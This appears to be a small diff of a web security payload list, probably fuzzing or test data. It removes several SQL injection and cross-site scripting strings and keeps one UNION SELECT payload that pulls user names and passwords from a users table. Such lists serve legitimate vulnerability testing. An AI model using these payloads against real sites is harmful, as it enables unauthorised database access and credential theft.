@@ -1,7 +1,1 @@
-' OR '1' = '1
 'union select user, password from users where '1' = '1
-1 or 1=1
-<script type='text/javascript'>alert('Vulnerable')</script>
-'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
-%22+or+isnull%281%2F0%29+%2F*
-'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--
